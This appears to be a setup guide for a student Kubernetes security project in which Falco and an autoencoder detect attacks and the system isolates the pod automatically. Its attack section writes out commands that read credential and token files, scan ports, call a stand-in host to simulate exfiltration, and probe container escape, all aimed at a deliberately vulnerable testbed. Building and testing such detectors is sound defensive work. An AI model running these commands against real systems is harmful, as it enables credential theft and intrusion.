# Kubernetes Linux Deployment & Setup Guide
## Scenario B: Real-Time Runtime Threat Detection & Automated Containment

> **Official Project Title:** AIOps-Enabled Threat Intelligence for Real-Time Security of Containerized Applications  
> **Target Environment:** Linux (Ubuntu 22.04 LTS / 24.04 LTS or Debian-based distributions)

---

## 1. System Requirements

| Resource | Minimum | Recommended |
|---|---|---|
| **OS** | Ubuntu 20.04+ / Debian 11+ | Ubuntu 22.04 / 24.04 LTS |
| **Kernel** | Linux >= 5.8 (for eBPF driver) | Linux 6.x |
| **CPU** | 4 Cores | 4–8 Cores |
| **RAM** | 8 GB | 16 GB |
| **Disk** | 30 GB free space | 50 GB SSD |
| **Privileges** | Sudo / Root access | Sudo user in `docker` group |

---

## 2. Step 1: Install All Linux Prerequisites

Open your Linux terminal (bash) and run the commands below.

### 2.1 Update System Packages
```bash
sudo apt-get update && sudo apt-get upgrade -y
sudo apt-get install -y curl wget git apt-transport-https ca-certificates gnupg lsb-release build-essential
```

### 2.2 Install Docker Engine
```bash
# Add Docker's official GPG key
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
sudo chmod a+r /etc/apt/keyrings/docker.gpg

# Set up the repository
echo \
  "deb [arch="$(dpkg --print-architecture)" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  "$(. /etc/os-release && echo "$VERSION_CODENAME")" stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

# Install Docker packages
sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

# Enable non-root user execution
sudo usermod -aG docker $USER
newgrp docker
```
*Verify Docker installation:*
```bash
docker run --rm hello-world
```

---

### 2.3 Install `kubectl` (Kubernetes CLI)
```bash
# Download and install the latest stable kubectl binary
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
rm kubectl

# Verify
kubectl version --client --output=yaml
```

---

### 2.4 Install Minikube (Local Kubernetes Cluster)
```bash
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube
rm minikube-linux-amd64

# Verify
minikube version
```

---

### 2.5 Install Helm (Kubernetes Package Manager)
```bash
curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash

# Verify
helm version
```

---

### 2.6 Install Python 3 & Node.js
```bash
# Python 3.10+ and virtual environment tools
sudo apt-get install -y python3 python3-pip python3-venv python3-dev

# Node.js (for serving the SOC Dashboard)
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

# Verify
python3 --version
node --version
npm --version
```

---

## 3. Step 2: Start Minikube with NetworkPolicy Support

> [!IMPORTANT]
> Standard Minikube without a CNI does **not** enforce `NetworkPolicy` objects. To demonstrate real network isolation and packet blocking at runtime, start Minikube with **Calico CNI**:

```bash
minikube start \
  --driver=docker \
  --cpus=4 \
  --memory=6144 \
  --cni=calico \
  --kubernetes-version=v1.28.3
```

Check cluster health:
```bash
kubectl cluster-info
kubectl get nodes
```

---

## 4. Step 3: Setup Project & Python Environment

Navigate to the project root directory:

```bash
cd ~/kubernetes-aiops-threat-detection   # or path to your cloned FYP directory

# Create and activate Python virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install dependencies
pip install --upgrade pip
pip install -r requirements.txt
```

### Train the Autoencoder Baseline Model
Generate baseline weights and reconstruction threshold from benign workload profiles:

```bash
python scripts/train_model.py --events 3000 --epochs 30 --output-dir models/autoencoder
```

Verify that model weights and metadata are generated:
```bash
ls -la models/autoencoder/
# Should show: model.pt and model_meta.json
```

---

## 5. Step 4: Deploy Kubernetes Workloads & Falco

### 5.1 Create the Dedicated Namespace
```bash
kubectl apply -f infrastructure/k8s/namespace.yaml
```

### 5.2 Deploy Intentionally Vulnerable Microservices (Testbed)
The testbed includes 3 tiers: `web-frontend` (Nginx), `api-backend` (Python Flask HTTP), and `redis-cache` (Redis):
```bash
kubectl apply -f infrastructure/k8s/vulnerable-app/

# Wait for testbed pods to be Running
kubectl get pods -n aiops-security -l app=vulnerable-testbed -w
```

### 5.3 Deploy Falco Runtime Monitor (eBPF Driver)
Falco intercepts kernel system calls inside containers using modern eBPF probes. You can deploy Falco using either **Helm** or the **included Kubernetes manifests**:

#### Option A: Deploy via Helm (Official Chart)
```bash
# Add Falco Helm repo
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

# Install Falco DaemonSet with JSON output enabled and modern eBPF probe
helm install falco falcosecurity/falco \
  --namespace aiops-security \
  --set driver.kind=modern_ebpf \
  --set tty=true \
  --set json_output=true \
  --set json_include_output_property=true \
  --set http_output.enabled=false

# Apply custom detection rules tailored to the testbed
kubectl apply -f infrastructure/k8s/falco/falco-config.yaml

# Wait for Falco DaemonSet pod to become ready
kubectl get pods -n aiops-security -l app.kubernetes.io/name=falco -w
```

#### Option B: Deploy via Project Manifests
```bash
# Deploys preconfigured Falco DaemonSet with custom rules ConfigMap
kubectl apply -f infrastructure/k8s/falco/

# Wait for Falco DaemonSet pod to become ready
kubectl get pods -n aiops-security -l app.kubernetes.io/name=falco -w
```

---

## 6. Step 5: Start the Complete System (Terminal Layout)

To run the live closed loop, open **3 terminal windows**:

### Terminal 1: Webhook Response Server (with live K8s enforcement)
```bash
source .venv/bin/activate

# Option 1: Using CLI flags
python response_engine/webhook_server.py --port 5000 --host 0.0.0.0 --model-dir models/autoencoder --no-dry-run

# Option 2: Using environment variables
# export DRY_RUN="false"
# export CONFIDENCE_THRESHOLD="0.80"
# export MODEL_DIR="models/autoencoder"
# python response_engine/webhook_server.py --port 5000 --host 0.0.0.0
```
*Output should show:* `Starting webhook server on 0.0.0.0:5000`, `Dry-run mode: False`, `Model directory: models/autoencoder`.

---

### Terminal 2: Stream Live Falco Telemetry into Aggregator & API

> [!WARNING]
> Terminal 2 (log aggregator) **MUST be started BEFORE** you launch any attacks in Terminal 4. The `--tail=0` flag means Falco only streams new events from the moment the log stream starts. If the aggregator isn't running when you execute attacks, those Falco alerts are lost.

```bash
source .venv/bin/activate

# For Helm installation:
kubectl logs -l app.kubernetes.io/name=falco -n aiops-security --follow --tail=0 | \
  python infrastructure/telemetry/log_aggregator.py --stdin \
    --forward-url http://localhost:5000/api/v1/event \
    --output unified_telemetry.jsonl \
    --raw-output-dir datasets/falco/raw

# (If using Option B direct manifests, replace the selector with -l app=falco):
# kubectl logs -l app=falco -n aiops-security --follow --tail=0 | \
#   python infrastructure/telemetry/log_aggregator.py --stdin \
#     --forward-url http://localhost:5000/api/v1/event \
#     --output unified_telemetry.jsonl \
#     --raw-output-dir datasets/falco/raw
```

*What the `--raw-output-dir` flag does:* Every raw Falco event is also saved into `datasets/falco/raw/<scenario>/` (e.g., `shell_execution/`, `credential_access/`, `network_scanning/`) for dataset building and future model retraining.

---

### Terminal 3: Launch SOC Dashboard UI
```bash
# Serve frontend dashboard at http://localhost:3333
npx -y serve dashboard -l 3333
```
Open **`http://localhost:3333`** in your browser. You will see the live SOC Dashboard displaying cluster pods, real-time alert feed, and isolation status.

---

## 7. Step 6: Trigger Real Attacks & Observe Automated Quarantine

> [!IMPORTANT]
> Ensure **Terminal 1** (webhook server) and **Terminal 2** (log aggregator) are both running before proceeding. The log aggregator must be actively streaming Falco logs.

Open **Terminal 4** to execute runtime attacks against the testbed container.

### Option A: Run the Automated Attack Script (Recommended)
```bash
chmod +x scripts/run_attacks.sh
bash scripts/run_attacks.sh
```
This runs all 5 attack scenarios automatically with proper delays between them.

### Option B: Run Attacks Manually

#### Get Target Pod Name
```bash
# Select the vulnerable api-backend pod (uses python:3.11-slim, has Python available)
TARGET_POD=$(kubectl get pods -n aiops-security -l component=api-backend -o jsonpath="{.items[0].metadata.name}")
echo "Target Vulnerable Pod: $TARGET_POD"
```

---

### 🚨 Attack Scenario 1: Unauthorized Shell Access (`kubectl exec`)
MITRE ATT&CK: **T1609 (Container Administration Command)**

```bash
# Spawn a shell inside the container (triggers Falco's "Shell Spawned in Container" rule)
kubectl exec $TARGET_POD -n aiops-security -- /bin/sh -c "echo 'Shell access gained'"
```
*What happens:*
1. Falco immediately flags the unexpected shell spawn (`execve` syscall).
2. Log aggregator normalizes the alert and forwards it to `/api/v1/event`.
3. ML pipeline scores the event and flags it as HIGH/CRITICAL risk.
4. Anomaly is mapped to `T1609`.
5. Webhook Server creates `aiops-isolate-<pod-name>` NetworkPolicy.
6. The container network is instantly cut!

---

### 🚨 Attack Scenario 2: Sensitive Credential Access
MITRE ATT&CK: **T1552.001 (Credentials in Files)**

```bash
# Read /etc/passwd (exists in all Linux containers)
kubectl exec $TARGET_POD -n aiops-security -- cat /etc/passwd

# Read the Kubernetes service account token (exists in all K8s pods)
kubectl exec $TARGET_POD -n aiops-security -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Attempt /etc/shadow (may not exist in slim images, but the open_read syscall is still flagged)
kubectl exec $TARGET_POD -n aiops-security -- cat /etc/shadow 2>/dev/null || echo "(Expected: file may not exist in slim image)"
```

---

### 🚨 Attack Scenario 3: Internal Discovery / Port Scanning
MITRE ATT&CK: **T1046 (Network Service Discovery)**

```bash
# Use Python's built-in socket library for network scanning (works on python:3.11-slim)
# No need to install nmap — this triggers Falco's "Unexpected Outbound Connection" rule
kubectl exec $TARGET_POD -n aiops-security -- python3 -c "
import socket
targets = ['10.244.0.1', '10.96.0.1', '10.96.0.10']
ports = [80, 443, 8080, 6379, 53]
for ip in targets:
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((ip, port))
            print(f'OPEN: {ip}:{port}')
            s.close()
        except:
            pass
print('Network scan complete')
"
```

---

### 🚨 Attack Scenario 4: Suspicious Outbound Connection / Exfiltration
MITRE ATT&CK: **T1041 (Exfiltration Over C2 Channel)**

```bash
# Use Python's urllib instead of curl (curl is not installed in python:3.11-slim)
kubectl exec $TARGET_POD -n aiops-security -- python3 -c "
import urllib.request
try:
    req = urllib.request.Request('http://203.0.113.10:9999/exfil_data')
    urllib.request.urlopen(req, timeout=2)
except Exception as e:
    print(f'Connection attempt (expected to fail): {e}')
"
```

---

### 🚨 Attack Scenario 5: Container Escape Probe
MITRE ATT&CK: **T1611 (Escape to Host)**

```bash
# Probe the host process namespace via /proc/1/root (triggers Falco's "Container Escape via Procfs" rule)
kubectl exec $TARGET_POD -n aiops-security -- /bin/sh -c "ls /proc/1/root/ 2>/dev/null || echo 'Access denied (expected)'"
```

---

## 8. Step 7: Verify Automated NetworkPolicy Isolation

In **Terminal 4**, verify that Kubernetes has dynamically applied the isolation rule:

### 1. Check Created NetworkPolicies
```bash
kubectl get networkpolicy -n aiops-security
```
*Expected Output:*
```
NAME                               POD-SELECTOR                                      AGE
aiops-isolate-api-backend-xxx      statefulset.kubernetes.io/pod-name=api-backend...  15s
```

### 2. Inspect the Generated Policy Rules
```bash
kubectl describe networkpolicy -n aiops-security
```
*Shows: `Deny Ingress` and `Deny Egress` — pod is quarantined!*

### 3. Verify Packet Blocking (Network Air-Gap)
Try to connect from the compromised pod:
```bash
kubectl exec $TARGET_POD -n aiops-security -- python3 -c "
import urllib.request
try:
    urllib.request.urlopen('https://google.com', timeout=3)
except Exception as e:
    print(f'Blocked: {e}')
"
```
*Result:* **Connection timed out / Drop (Blocked by Calico CNI NetworkPolicy)**.

---

## 9. Rollback & Remediation (Unquarantine Pod)

Once the incident investigation is complete, remove the quarantine policy:

```bash
# Option A: Via Python API
python -c "
from response_engine.network_policy_manager import NetworkPolicyManager
npm = NetworkPolicyManager(dry_run=False)
npm.rollback_isolation('$TARGET_POD', 'aiops-security')
"

# Option B: Via kubectl directly
kubectl delete networkpolicy aiops-isolate-$TARGET_POD -n aiops-security
```

---

## 10. Verification & Test Suite Execution

Run the complete test suite to verify ML models, preprocessing, feature extraction, API routes, and isolation logic:

```bash
source .venv/bin/activate
pytest tests/ -v
```

---

## 11. Troubleshooting & Quick Fixes

| Issue | Root Cause | Solution |
|---|---|---|
| `Falco pod CrashLoopBackOff` | Linux kernel headers missing or eBPF probe not loaded | Run `sudo apt-get install -y linux-headers-$(uname -r)` and ensure Minikube uses `--driver=docker`. |
| `NetworkPolicy not blocking packets` | Minikube was started without CNI support | Delete and restart cluster with Calico: `minikube delete && minikube start --cni=calico`. |
| `TARGET_POD variable is empty` | Incorrect pod label selector | Use `-l component=api-backend` or `-l app=vulnerable-testbed`. |
| `Cannot connect to K8s API from Webhook Server` | Kubeconfig not found in current shell | Run `export KUBECONFIG=~/.kube/config` and verify `kubectl get nodes`. |
| `Dashboard not showing alerts` | CORS or Webhook server not running on port 5000 | Check `curl http://localhost:5000/api/v1/status` to ensure API returns HTTP 200. |
| `log_aggregator unrecognized arguments` | Outdated log_aggregator script | Ensure `log_aggregator.py` has `--forward-url` support. |

---

## 12. Teardown / Cleanup

To stop and remove all local Kubernetes resources:

```bash
# Delete all resources in namespace
kubectl delete namespace aiops-security

# Stop and delete Minikube cluster
minikube stop
minikube delete
```
